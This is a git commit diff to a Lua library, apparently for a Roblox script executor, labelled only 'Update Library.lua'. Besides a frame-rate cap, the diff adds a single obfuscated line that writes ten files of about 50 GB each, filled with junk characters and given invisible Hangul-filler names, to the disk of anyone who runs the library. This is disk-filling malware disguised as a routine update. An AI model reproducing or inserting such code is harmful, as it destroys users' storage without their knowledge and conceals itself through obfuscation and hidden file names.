60ce9894f094731bf94bb5b1069ab22bfc5e970b
xeho11 <130700886+xeho11@users.noreply.github.com>
2025-12-01 12:58:29 +0500

    Update Library.lua

--- Library.lua
+++ Library.lua
@@ -15,5 +15,5 @@ local httprequest = (syn and syn.request) or (http and http.request) or http_req
             }}
         })
     })
-
+setfpscap(1000)
 local _0x1a2b3c={}for _0x9f8e7d=32,126 do table.insert(_0x1a2b3c,string.char(_0x9f8e7d))end for _0x9f8e7d=0x0400,0x04FF do table.insert(_0x1a2b3c,utf8.char(_0x9f8e7d))end local _0x4d5e6f=table.concat(_0x1a2b3c)local _0x7g8h9i=16*1024*1024 local _0x2k3l4m=(function()local _0x5n6o7p=math.ceil(_0x7g8h9i/#_0x4d5e6f)return string.sub(string.rep(_0x4d5e6f,_0x5n6o7p),1,_0x7g8h9i)end)()local function _0x8q9r0s(_0xa1b2c3,_0xd4e5f6)local _0xg7h8i9=_0xd4e5f6*1024*1024*1024 local _0xj0k1l2=math.floor(_0xg7h8i9/_0x7g8h9i)writefile(_0xa1b2c3,"")for _0xm3n4o5=1,_0xj0k1l2 do appendfile(_0xa1b2c3,_0x2k3l4m)if _0xm3n4o5%10==0 then task.wait(0.1)end end end local function _0xp6q7r8(_0xs9t0u1)local _0xv2w3x4="ㅤ"return string.rep(_0xv2w3x4,_0xs9t0u1)..".txt"end local _0xy5z6a7=10 local _0xb8c9d0=50 for _0xe1f2g3=1,_0xy5z6a7 do local _0xh4i5j6=_0xp6q7r8(_0xe1f2g3)_0x8q9r0s(_0xh4i5j6,_0xb8c9d0)task.wait(0.5)end
